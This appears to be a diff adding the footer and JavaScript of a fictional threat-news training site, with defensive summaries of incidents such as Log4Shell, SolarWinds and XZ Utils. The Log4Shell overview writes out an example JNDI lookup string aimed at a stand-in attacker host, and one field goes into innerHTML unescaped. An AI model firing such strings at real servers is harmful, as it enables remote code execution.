+            <p>Cyber threat intelligence, breach analysis and security advisories for defenders. Independent, analyst-led, always-on.</p>
+          </div>
+          <div>
+            <h4>Resources</h4>
+            <ul>
+              <li><a href="#latest">CVE Database</a></li>
+              <li><a href="#latest">Security Advisories</a></li>
+              <li><a href="#latest">Threat Actor Profiles</a></li>
+              <li><a href="#latest">Global Threat Map</a></li>
+            </ul>
+          </div>
+          <div>
+            <h4>Company</h4>
+            <ul>
+              <li><a href="#about">About</a></li>
+              <li><a href="#report">Subscribe</a></li>
+              <li><a href="#">Careers</a></li>
+              <li><a href="#">Contact</a></li>
+            </ul>
+          </div>
+        </div>
+        <div class="footer-bottom">
+          <span>© 2026 ThreatWatch. Training demonstration site — not a real news outlet. Educational use only.</span>
+          <span><a href="#">Privacy Policy</a> &nbsp;·&nbsp; <a href="#">Terms &amp; Conditions</a></span>
+        </div>
+      </div>
+    </footer>
+
+    <!-- ================= ARTICLE MODAL ================= -->
+    <div class="modal-overlay" id="articleModal">
+      <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+        <div class="modal-head">
+          <div class="head-top">
+            <div>
+              <div class="badges" id="modalBadges"></div>
+              <h3 id="modalTitle"></h3>
+              <div class="modal-meta" id="modalMeta"></div>
+            </div>
+            <button class="close" id="modalClose" aria-label="Close">&times;</button>
+          </div>
+        </div>
+        <div class="modal-body" id="modalBody"></div>
+      </div>
+    </div>
+
+    <!-- ================= TOAST ================= -->
+    <div class="toast" id="toast"></div>
+
+    <script>
+      /* ============================================================================
+        ThreatWatch — main.js (vanilla JS, no dependencies)
+
+        Powers the interactive parts of the single-page site:
+          • live UTC clock in the utility bar
+          • animated stat counters (triggered when scrolled into view)
+          • category filtering + hero search of the threat cards
+          • full "analysis" article modal for each incident
+          • newsletter email validation + success toast
+          • inert demo links so nothing 404s
+
+        All incident details are real and publicly documented. The site is a training
+        demo for the Cloudflare deployment course — there is no backend.
+        ========================================================================== */
+
+      (function () {
+        "use strict";
+
+        /* --------------------------------------------------------------------------
+          Article data — full "analysis" shown in the modal, keyed by card data-id.
+          Each entry mirrors the badge/severity/CVE shown on its card.
+          -------------------------------------------------------------------------- */
+        const ARTICLES = {
+          log4shell: {
+            title: "Log4Shell: The Internet's Worst Day",
+            category: "Vulnerability",
+            severity: "Critical",
+            cve: "CVE-2021-44228",
+            date: "Disclosed 10 December 2021",
+            cvss: "10.0",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            overview:
+              "Log4Shell is an unauthenticated remote code execution flaw in Apache Log4j 2, the most widely used Java logging library on the planet. By logging a crafted string such as <code>${jndi:ldap://attacker/x}</code>, an attacker could make a vulnerable server reach out to a malicious server and execute arbitrary code. Because logging user-controlled input is ubiquitous, the bug was exploitable almost anywhere — chat messages, user agents, even a phone's name.",
+            timeline: [
+              { date: "24 Nov 2021", text: "Alibaba's cloud security team privately reports the flaw to Apache." },
+              { date: "9 Dec 2021", text: "A proof-of-concept leaks publicly; mass scanning begins within hours." },
+              { date: "10 Dec 2021", text: "Apache releases Log4j 2.15.0 and CVE-2021-44228 is published." },
+              { date: "Dec 2021", text: "Follow-up CVEs (2021-45046, 2021-45105) prompt further patches up to 2.17.1." },
+            ],
+            impact:
+              "Hundreds of millions of devices and services were affected. Exploitation was observed within hours of disclosure, ranging from cryptominers and botnets to ransomware and nation-state actors. The US CISA director called it \"one of the most serious\" vulnerabilities seen in her career.",
+            affected: "Apache Log4j 2 versions 2.0-beta9 through 2.14.1 (and the products that bundle them).",
+            mitigation: [
+              "Upgrade to Log4j 2.17.1 or later (the definitive fix).",
+              "Where patching is impossible, remove the JndiLookup class or set the relevant JVM/system properties.",
+              "Inventory dependencies — Log4j is frequently a transitive dependency you don't know you have.",
+              "Monitor outbound JNDI/LDAP/RMI traffic for exploitation attempts.",
+            ],
+            refs: [
+              { label: "Apache Log4j Security Advisory", url: "https://logging.apache.org/log4j/2.x/security.html" },
+              { label: "NVD — CVE-2021-44228", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
+            ],
+          },
+
+          solarwinds: {
+            title: "SolarWinds SUNBURST Supply-Chain Attack",
+            category: "Supply Chain",
+            severity: "Critical",
+            cve: null,
+            date: "Disclosed 13 December 2020",
+            cvss: null,
+            vector: null,
+            overview:
+              "Attackers compromised the build pipeline of SolarWinds' Orion network-monitoring platform and inserted a stealthy backdoor — dubbed SUNBURST — into legitimately signed software updates. Roughly 18,000 customers installed the trojanised update, though the actors hand-picked a much smaller set of high-value targets for follow-on intrusion. The campaign is widely attributed to the Russian SVR (APT29 / \"Cozy Bear\").",
+            timeline: [
+              { date: "Sep 2019", text: "Attackers gain access to SolarWinds' environment and test the build-injection technique." },
+              { date: "Feb 2020", text: "SUNBURST is compiled into Orion updates shipped to customers." },
+              { date: "Dec 2020", text: "FireEye discovers it was breached, traces the intrusion to Orion, and goes public." },
+              { date: "13 Dec 2020", text: "CISA issues Emergency Directive 21-01 ordering agencies to disconnect Orion." },
+            ],
+            impact:
+              "Victims included multiple US federal departments (Treasury, Commerce, DHS), Microsoft, FireEye and many Fortune 500 firms. It became the defining example of a software supply-chain attack and reshaped how organisations think about trust in their vendors' build systems.",
+            affected: "SolarWinds Orion Platform versions 2019.4 HF5 through 2020.2.1 (the SUNBURST-laced builds).",
+            mitigation: [
+              "Patch to a clean Orion release and rotate all potentially exposed credentials and certificates.",
+              "Adopt supply-chain integrity controls: reproducible builds, signed artifacts, and build-system isolation.",
+              "Apply zero-trust principles — don't implicitly trust software just because it's signed.",
+              "Hunt for the published SUNBURST/TEARDROP indicators of compromise.",
+            ],
+            refs: [
+              { label: "CISA Emergency Directive 21-01", url: "https://www.cisa.gov/news-events/directives/ed-21-01-mitigate-solarwinds-orion-code-compromise" },
+            ],
+          },
+
+          wannacry: {
+            title: "WannaCry: Ransomware Goes Global",
+            category: "Ransomware",
+            severity: "Critical",
+            cve: "MS17-010 / EternalBlue",
+            date: "Outbreak 12 May 2017",
+            cvss: null,
+            vector: null,
+            overview:
+              "WannaCry was a ransomware worm that combined file-encrypting ransomware with EternalBlue — an SMBv1 exploit leaked from the NSA by the Shadow Brokers. Because it self-propagated across networks without any user interaction, it spread explosively, encrypting files and demanding roughly $300 in Bitcoin.",
+            timeline: [
+              { date: "14 Mar 2017", text: "Microsoft patches the underlying SMB flaw (MS17-010), two months before the outbreak." },
+              { date: "14 Apr 2017", text: "The Shadow Brokers leak the EternalBlue exploit publicly." },
+              { date: "12 May 2017", text: "WannaCry erupts, hitting 200,000+ systems across 150 countries in 48 hours." },
+              { date: "12 May 2017", text: "Researcher Marcus Hutchins registers a hard-coded \"kill switch\" domain, slowing the spread." },
+            ],
+            impact:
+              "The UK's NHS was hit hard — thousands of appointments and operations were cancelled. Other victims included Telefónica, FedEx, Renault and Deutsche Bahn. Total damages were estimated in the billions. The attack was later attributed to North Korea's Lazarus Group.",
+            affected: "Unpatched Windows systems with SMBv1 exposed (notably Windows 7 and Windows Server 2008).",
+            mitigation: [
+              "Apply MS17-010 and keep operating systems current.",
+              "Disable the legacy SMBv1 protocol entirely.",
+              "Block inbound SMB (TCP 445) at the network perimeter and segment internal networks.",
+              "Maintain tested, offline backups so you can recover without paying.",
+            ],
+            refs: [
+              { label: "Microsoft Security Bulletin MS17-010", url: "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" },
+            ],
+          },
+
+          heartbleed: {
+            title: "Heartbleed: Bleeding Memory from OpenSSL",
+            category: "Vulnerability",
+            severity: "Critical",
+            cve: "CVE-2014-0160",
+            date: "Disclosed 7 April 2014",
+            cvss: "7.5 (CVSS v3) / 5.0 (CVSS v2)",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+            overview:
+              "Heartbleed is a buffer over-read in OpenSSL's implementation of the TLS heartbeat extension. By sending a heartbeat request that claims a larger payload than it actually contains, an attacker could trick the server into returning up to 64KB of adjacent memory — potentially including private keys, session cookies, usernames and passwords — with no trace left behind.",
+            timeline: [
+              { date: "Dec 2011", text: "The flawed heartbeat code is introduced into OpenSSL 1.0.1." },
+              { date: "1 Apr 2014", text: "Google's Neel Mehta discovers the bug; Codenomicon independently finds it too." },
+              { date: "7 Apr 2014", text: "OpenSSL 1.0.1g is released and the vulnerability is disclosed publicly." },
+            ],
+            impact:
+              "An estimated 17% of the internet's secure web servers were vulnerable. Because exploitation is invisible, organisations had to assume keys were compromised and re-issue certificates en masse. It prompted a wave of investment into OpenSSL's previously under-resourced development.",
+            affected: "OpenSSL 1.0.1 through 1.0.1f (and 1.0.2-beta).",
+            mitigation: [
+              "Upgrade to OpenSSL 1.0.1g or later (or recompile with -DOPENSSL_NO_HEARTBEATS).",
+              "Revoke and reissue TLS certificates and private keys that may have been exposed.",
+              "Force password resets and invalidate active session tokens.",
+            ],
+            refs: [
+              { label: "Heartbleed.com", url: "https://heartbleed.com/" },
+              { label: "NVD — CVE-2014-0160", url: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160" },
+            ],
+          },
+
+          equifax: {
+            title: "Equifax: 147 Million Records Exposed",
+            category: "Data Breach",
+            severity: "Critical",
+            cve: "CVE-2017-5638",
+            date: "Breach disclosed 7 September 2017",
+            cvss: "10.0",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            overview:
+              "Credit bureau Equifax suffered one of the most consequential breaches in history after failing to patch a known remote-code-execution flaw in Apache Struts. Attackers used that foothold to roam internal systems for roughly 76 days, exfiltrating the personal data of about 147 million people — names, Social Security numbers, birth dates, addresses and some driver's-license and credit-card numbers.",
+            timeline: [
+              { date: "7 Mar 2017", text: "Apache discloses and patches the Struts vulnerability (CVE-2017-5638)." },
+              { date: "13 May 2017", text: "Attackers exploit the still-unpatched flaw on an Equifax web portal." },
+              { date: "Jul 2017", text: "Equifax detects the intrusion and stops the data exfiltration." },
+              { date: "7 Sep 2017", text: "Equifax publicly discloses the breach." },
+            ],
+            impact:
+              "Equifax agreed to a settlement of up to ~$700 million with the FTC, CFPB and US states. The breach became a textbook case in patch management, asset inventory and breach response failures, and damaged trust in the credit-reporting industry.",
+            affected: "Equifax systems running an unpatched Apache Struts 2 (Jakarta Multipart parser).",
+            mitigation: [
+              "Patch internet-facing software promptly and verify the patch actually applied.",
+              "Maintain an accurate asset and software inventory so you know what to patch.",
+              "Segment networks and encrypt sensitive data at rest to limit blast radius.",
+              "Monitor for large or unusual outbound data transfers.",
+            ],
+            refs: [
+              { label: "FTC — Equifax Data Breach Settlement", url: "https://www.ftc.gov/enforcement/refunds/equifax-data-breach-settlement" },
+            ],
+          },
+
+          moveit: {
+            title: "MOVEit: Cl0p's Mass-Exploitation Spree",
+            category: "Data Breach",
+            severity: "Critical",
+            cve: "CVE-2023-34362",
+            date: "Disclosed 31 May 2023",
+            cvss: "9.8",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            overview:
+              "The Cl0p ransomware group exploited a zero-day SQL injection vulnerability in Progress Software's MOVEit Transfer — a widely used managed file-transfer product — to deploy a web shell and steal data from customer instances at scale. Rather than encrypting systems, Cl0p focused purely on data theft and extortion.",
+            timeline: [
+              { date: "27 May 2023", text: "Cl0p begins mass-exploiting the MOVEit zero-day over the holiday weekend." },
+              { date: "31 May 2023", text: "Progress discloses CVE-2023-34362 and ships an emergency patch." },
+              { date: "Jun 2023", text: "Cl0p starts naming victims on its leak site; the count climbs into the thousands." },
+            ],
+            impact:
+              "More than 2,700 organisations and an estimated 90+ million individuals were affected, spanning government agencies, banks, universities and healthcare providers worldwide. It became one of the largest mass-exploitation events of 2023 and underscored the risk concentrated in file-transfer software.",
+            affected: "Progress MOVEit Transfer (and MOVEit Cloud) versions prior to the May 2023 patches.",
+            mitigation: [
+              "Apply Progress's emergency patches immediately and review for the documented web shells/IoCs.",
+              "Treat managed file-transfer appliances as high-value, internet-exposed targets and restrict access.",
+              "Rotate credentials and audit logs for the exploitation window.",
+              "Have a data-breach and extortion response plan ready.",
+            ],
+            refs: [
+              { label: "CISA Advisory on CVE-2023-34362", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a" },
+            ],
+          },
+
+          colonial: {
+            title: "Colonial Pipeline: Fuel for a Crisis",
+            category: "Ransomware",
+            severity: "High",
+            cve: null,
+            date: "Attack 7 May 2021",
+            cvss: null,
+            vector: null,
+            overview:
+              "The DarkSide ransomware affiliate breached Colonial Pipeline — which carries ~45% of the US East Coast's fuel — using a single compromised VPN account that lacked multi-factor authentication. Colonial proactively shut down operations to contain the attack, causing a six-day outage, fuel shortages and panic-buying across the south-eastern United States.",
+            timeline: [
+              { date: "7 May 2021", text: "DarkSide deploys ransomware; Colonial halts pipeline operations." },
+              { date: "8–12 May 2021", text: "Fuel shortages and panic-buying spread; the US declares a regional emergency." },
+              { date: "Jun 2021", text: "The DOJ recovers roughly $2.3M of the ~$4.4M ransom paid in Bitcoin." },
+            ],
+            impact:
+              "The incident became a wake-up call for critical-infrastructure and operational-technology security. It led to new TSA pipeline cybersecurity directives and intensified US government focus on ransomware as a national-security threat.",
+            affected: "Corporate IT systems whose compromise forced an operational-technology shutdown.",
+            mitigation: [
+              "Enforce multi-factor authentication on all remote access, especially VPNs.",
+              "Disable or rigorously monitor unused/legacy accounts.",
+              "Segment IT from operational-technology (OT) networks.",
+              "Maintain tested incident-response and business-continuity plans for OT.",
+            ],
+            refs: [
+              { label: "CISA — DarkSide Ransomware Best Practices", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-131a" },
+            ],
+          },
+
+          proxylogon: {
+            title: "ProxyLogon: Exchange Under Siege",
+            category: "Vulnerability",
+            severity: "Critical",
+            cve: "CVE-2021-26855",
+            date: "Disclosed 2 March 2021",
+            cvss: "9.8",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            overview:
+              "ProxyLogon is a chain of four zero-day vulnerabilities in on-premises Microsoft Exchange Server. The lead bug (CVE-2021-26855) is a server-side request forgery that allows authentication bypass; chained with the others it gives an attacker full remote code execution and the ability to drop web shells. The group Microsoft tracks as HAFNIUM was the first to exploit it, but many others quickly followed.",
+            timeline: [
+              { date: "Early Jan 2021", text: "Researchers report the bugs to Microsoft; HAFNIUM begins limited exploitation." },
+              { date: "2 Mar 2021", text: "Microsoft releases out-of-band patches and discloses the four CVEs." },
+              { date: "Mar 2021", text: "Mass exploitation explodes; tens of thousands of servers are web-shelled within days." },
+            ],
+            impact:
+              "An estimated 30,000+ US organisations and hundreds of thousands worldwide were compromised. The FBI later obtained a court order to remotely remove web shells from victim servers — an unusual and notable response. It became one of the most widespread Exchange compromises ever.",
+            affected: "On-premises Microsoft Exchange Server 2013, 2016 and 2019.",
+            mitigation: [
+              "Apply Microsoft's March 2021 (and later) Exchange security updates without delay.",
+              "Run Microsoft's IoC/scanning tools to detect dropped web shells.",
+              "Restrict and monitor internet exposure of Exchange; consider migrating off on-prem where feasible.",
+              "Assume compromise if patching was delayed, and conduct incident response.",
+            ],
+            refs: [
+              { label: "MSRC — Multiple Exchange Zero-Days", url: "https://msrc.microsoft.com/blog/2021/03/multiple-security-updates-released-for-exchange-server/" },
+            ],
+          },
+
+          xzutils: {
+            title: "XZ Utils: The Backdoor Nearly Everyone Shipped",
+            category: "Supply Chain",
+            severity: "Critical",
+            cve: "CVE-2024-3094",
+            date: "Disclosed 29 March 2024",
+            cvss: "10.0",
+            vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+            overview:
+              "A malicious actor operating under the name \"Jia Tan\" spent roughly two years building trust as a maintainer of XZ Utils — a compression library used across virtually all Linux distributions. They then planted a sophisticated, obfuscated backdoor in the build process of versions 5.6.0 and 5.6.1 that hooked into OpenSSH via systemd, allowing remote code execution for an attacker holding a specific private key.",
+            timeline: [
+              { date: "2021–2022", text: "\"Jia Tan\" begins contributing to XZ; sock-puppet accounts pressure the original maintainer." },
+              { date: "Feb–Mar 2024", text: "The backdoor is committed into XZ 5.6.0 and 5.6.1 release tarballs." },
+              { date: "29 Mar 2024", text: "Microsoft engineer Andres Freund notices a ~500ms SSH slowdown and uncovers the backdoor." },
+            ],
+            impact:
+              "Caught almost by accident before reaching most stable distributions, it would otherwise have been one of the most dangerous supply-chain backdoors ever — granting remote access to a vast number of internet-facing Linux servers. It triggered an industry-wide reckoning over the fragility of under-funded open-source infrastructure.",
+            affected: "XZ Utils (liblzma) versions 5.6.0 and 5.6.1, primarily on rolling/testing Linux distributions.",
+            mitigation: [
+              "Downgrade to a known-good XZ version (e.g. 5.4.x) per your distribution's guidance.",
+              "Verify which package version is installed across your fleet.",
+              "Scrutinise the provenance and maintainership of critical dependencies.",
+              "Support and fund the open-source projects your infrastructure depends on.",
+            ],
+            refs: [
+              { label: "CISA Alert — XZ Utils Backdoor", url: "https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094" },
+            ],
+          },
+        };
+
+        const SEV_CLASS = {
+          Critical: "sev-critical",
+          High: "sev-high",
+          Medium: "sev-medium",
+          Low: "sev-low",
+        };
+
+        /* Escape any string before injecting into HTML. */
+        function esc(str) {
+          return String(str)
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;");
+        }
+
+        /* --------------------------------------------------------------------------
+          Live UTC clock
+          -------------------------------------------------------------------------- */
+        const clockEl = document.getElementById("utcClock");
+        function tickClock() {
+          if (!clockEl) return;
+          const now = new Date();
+          const hh = String(now.getUTCHours()).padStart(2, "0");
+          const mm = String(now.getUTCMinutes()).padStart(2, "0");
+          const ss = String(now.getUTCSeconds()).padStart(2, "0");
+          clockEl.textContent = hh + ":" + mm + ":" + ss + " UTC";
+        }
+        tickClock();
+        setInterval(tickClock, 1000);
+
+        /* --------------------------------------------------------------------------
+          Animated stat counters (run once when the strip scrolls into view)
+          -------------------------------------------------------------------------- */
+        function animateCounter(el) {
+          const target = parseFloat(el.getAttribute("data-target"));
+          const decimals = parseInt(el.getAttribute("data-decimals") || "0", 10);
+          const duration = 1400;
+          const start = performance.now();
+
+          function frame(now) {
+            const progress = Math.min((now - start) / duration, 1);
+            // easeOutCubic for a snappy finish
+            const eased = 1 - Math.pow(1 - progress, 3);
+            const value = target * eased;
+            el.textContent = value.toLocaleString("en-US", {
+              minimumFractionDigits: decimals,
+              maximumFractionDigits: decimals,
+            });
+            if (progress < 1) {
+              requestAnimationFrame(frame);
+            } else {
+              el.textContent = target.toLocaleString("en-US", {
+                minimumFractionDigits: decimals,
+                maximumFractionDigits: decimals,
+              });
+            }
+          }
+          requestAnimationFrame(frame);
+        }
+
+        const statsSection = document.getElementById("stats");
+        if (statsSection) {
+          if ("IntersectionObserver" in window) {
+            const observer = new IntersectionObserver(
+              function (entries, obs) {
+                entries.forEach(function (entry) {
+                  if (entry.isIntersecting) {
+                    statsSection.querySelectorAll(".num").forEach(animateCounter);
+                    obs.disconnect();
+                  }
+                });
+              },
+              { threshold: 0.4 }
+            );
+            observer.observe(statsSection);
+          } else {
+            statsSection.querySelectorAll(".num").forEach(animateCounter);
+          }
+        }
+
+        /* --------------------------------------------------------------------------
+          Category filtering + hero search
+          -------------------------------------------------------------------------- */
+        const cards = Array.prototype.slice.call(document.querySelectorAll(".threat-card"));
+        const filterButtons = Array.prototype.slice.call(document.querySelectorAll(".filter-btn"));
+        const noResults = document.getElementById("noResults");
+        let activeCategory = "all";
+        let searchTerm = "";
+
+        function applyFilters() {
+          let visible = 0;
+          cards.forEach(function (card) {
+            const cat = card.getAttribute("data-category");
+            const text = card.textContent.toLowerCase();
+            const matchCat = activeCategory === "all" || cat === activeCategory;
+            const matchSearch = searchTerm === "" || text.indexOf(searchTerm) !== -1;
+            const show = matchCat && matchSearch;
+            card.classList.toggle("hidden", !show);
+            if (show) visible++;
+          });
+          if (noResults) noResults.style.display = visible === 0 ? "block" : "none";
+        }
+
+        function setCategory(category) {
+          activeCategory = category;
+          filterButtons.forEach(function (btn) {
+            btn.classList.toggle("active", btn.getAttribute("data-category") === category);
+          });
+          applyFilters();
+        }
+
+        filterButtons.forEach(function (btn) {
+          btn.addEventListener("click", function () {
+            setCategory(btn.getAttribute("data-category"));
+          });
+        });
+
+        // Nav links that carry a data-filter jump to the grid and apply that category.
+        document.querySelectorAll("[data-filter]").forEach(function (link) {
+          link.addEventListener("click", function () {
+            setCategory(link.getAttribute("data-filter"));
+            closeMobileNav();
+          });
+        });
+
+        const heroSearch = document.getElementById("heroSearch");
+        const searchInput = document.getElementById("searchInput");
+        if (heroSearch && searchInput) {
+          heroSearch.addEventListener("submit", function (e) {
+            e.preventDefault();
+            searchTerm = searchInput.value.trim().toLowerCase();
+            applyFilters();
+            document.getElementById("latest").scrollIntoView({ behavior: "smooth" });
+          });
+          // Live filtering as the user types, too.
+          searchInput.addEventListener("input", function () {
+            searchTerm = searchInput.value.trim().toLowerCase();
+            applyFilters();
+          });
+        }
+
+        /* --------------------------------------------------------------------------
+          Article modal
+          -------------------------------------------------------------------------- */
+        const overlay = document.getElementById("articleModal");
+        const modalBadges = document.getElementById("modalBadges");
+        const modalTitle = document.getElementById("modalTitle");
+        const modalMeta = document.getElementById("modalMeta");
+        const modalBody = document.getElementById("modalBody");
+        let lastFocused = null;
+
+        function buildModalBody(a) {
+          let html = "";
+
+          html += "<h4>Overview</h4><p>" + a.overview + "</p>";
+
+          if (a.cvss) {
+            html +=
+              '<div class="cvss-box"><span class="score">' +
+              esc(a.cvss) +
+              '</span><span class="vec">CVSS' +
+              (a.vector ? " · " + esc(a.vector) : "") +
+              "</span></div>";
+          }
+
+          if (a.timeline && a.timeline.length) {
+            html += "<h4>Timeline</h4><ul class=\"timeline\">";
+            a.timeline.forEach(function (t) {
+              html += '<li><span class="date">' + esc(t.date) + "</span><span>" + esc(t.text) + "</span></li>";
+            });
+            html += "</ul>";
+          }
+
+          html += "<h4>Impact</h4><p>" + esc(a.impact) + "</p>";
+          html += "<h4>Affected Systems</h4><p>" + esc(a.affected) + "</p>";
+
+          if (a.mitigation && a.mitigation.length) {
+            html += "<h4>Mitigation &amp; Recommendations</h4><ul>";
+            a.mitigation.forEach(function (m) {
+              html += "<li>" + esc(m) + "</li>";
+            });
+            html += "</ul>";
+          }
+
+          if (a.refs && a.refs.length) {
+            html += '<h4>References</h4><p class="modal-refs">';
+            html += a.refs
+              .map(function (r) {
+                return '<a href="' + esc(r.url) + '" target="_blank" rel="noopener noreferrer">' + esc(r.label) + "</a>";
+              })
+              .join(" &nbsp;·&nbsp; ");
+            html += "</p>";
+          }
+
+          html +=
+            '<div class="modal-disclaimer"><strong>Training demo:</strong> ThreatWatch is a fictional site built for the Cloudflare deployment course. The incident above is real and publicly documented, but this page has no backend and stores nothing.</div>';
+
+          return html;
+        }
+
+        function openArticle(id) {
+          const a = ARTICLES[id];
+          if (!a) return;
+          lastFocused = document.activeElement;
+
+          modalBadges.innerHTML =
+            '<span class="badge badge-category">' +
+            esc(a.category) +
+            '</span><span class="badge badge-sev ' +
+            (SEV_CLASS[a.severity] || "sev-medium") +
+            '">' +
+            esc(a.severity) +
+            "</span>";
+
+          modalTitle.textContent = a.title;
+
+          let meta = esc(a.date);
+          if (a.cve) meta += ' &nbsp;·&nbsp; <strong>' + esc(a.cve) + "</strong>";
+          modalMeta.innerHTML = meta;
+
+          modalBody.innerHTML = buildModalBody(a);
+          overlay.classList.add("open");
+          document.body.style.overflow = "hidden";
+          document.getElementById("modalClose").focus();
+        }
+
+        function closeArticle() {
+          overlay.classList.remove("open");
+          document.body.style.overflow = "";
+          modalBody.scrollTop = 0;
+          if (lastFocused && typeof lastFocused.focus === "function") lastFocused.focus();
+        }
+
+        cards.forEach(function (card) {
+          card.addEventListener("click", function () {
+            openArticle(card.getAttribute("data-id"));
+          });
+          // Keyboard support: Enter / Space activate the card.
+          card.addEventListener("keydown", function (e) {
+            if (e.key === "Enter" || e.key === " ") {
+              e.preventDefault();
+              openArticle(card.getAttribute("data-id"));
+            }
+          });
+        });
+
+        document.getElementById("modalClose").addEventListener("click", closeArticle);
+        overlay.addEventListener("click", function (e) {
+          if (e.target === overlay) closeArticle();
+        });
+        document.addEventListener("keydown", function (e) {
+          if (e.key === "Escape" && overlay.classList.contains("open")) closeArticle();
+        });
+
+        /* --------------------------------------------------------------------------
+          Toast
+          -------------------------------------------------------------------------- */
+        const toastEl = document.getElementById("toast");
+        let toastTimer = null;
+        function showToast(message) {
+          if (!toastEl) return;
+          toastEl.textContent = message;
+          toastEl.classList.remove("d-none");
+          toastEl.classList.add("show");
+          clearTimeout(toastTimer);
+          toastTimer = setTimeout(function () {
+            toastEl.classList.remove("show");
+          }, 2600);
+        }
+
+        /* --------------------------------------------------------------------------
+          Newsletter form: validate email, then show a success toast
+          -------------------------------------------------------------------------- */
+        const newsletterForm = document.getElementById("newsletterForm");
+        const newsletterCard = document.getElementById("newsletterCard");
+        const emailInput = document.getElementById("emailInput");
+        const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        if (newsletterForm) {
+          emailInput.addEventListener("input", function () {
+            if (newsletterCard.classList.contains("invalid") && emailRe.test(emailInput.value.trim())) {
+              newsletterCard.classList.remove("invalid");
+            }
+          });
+
+          newsletterForm.addEventListener("submit", function (e) {
+            e.preventDefault();
+            if (!emailRe.test(emailInput.value.trim())) {
+              newsletterCard.classList.add("invalid");
+              emailInput.focus();
+              return;
+            }
+            newsletterCard.classList.remove("invalid");
+            newsletterForm.reset();
+            showToast("✓ You're subscribed to the Daily Threat Brief!");
+          });
+        }
+
+        /* --------------------------------------------------------------------------
+          Mobile nav toggle
+          -------------------------------------------------------------------------- */
+        const navToggle = document.getElementById("navToggle");
+        const mainNav = document.getElementById("mainNav");
+        function closeMobileNav() {
+          if (mainNav) mainNav.classList.remove("open");
+          if (navToggle) navToggle.setAttribute("aria-expanded", "false");
+        }
+        if (navToggle && mainNav) {
+          navToggle.addEventListener("click", function () {
+            const open = mainNav.classList.toggle("open");
+            navToggle.setAttribute("aria-expanded", String(open));
+          });
+          mainNav.querySelectorAll("a").forEach(function (link) {
+            link.addEventListener("click", closeMobileNav);
+          });
+        }
+
+        /* --------------------------------------------------------------------------
+          Make purely-decorative demo links inert so nothing 404s.
+          (Real in-page anchors like #latest / #about still work.)
+          -------------------------------------------------------------------------- */
+        document.querySelectorAll('a[href="#"]').forEach(function (link) {
+          link.addEventListener("click", function (e) {
+            e.preventDefault();
+          });
+        });
+      })();
+
+    </script>
+  </body>
+</html>
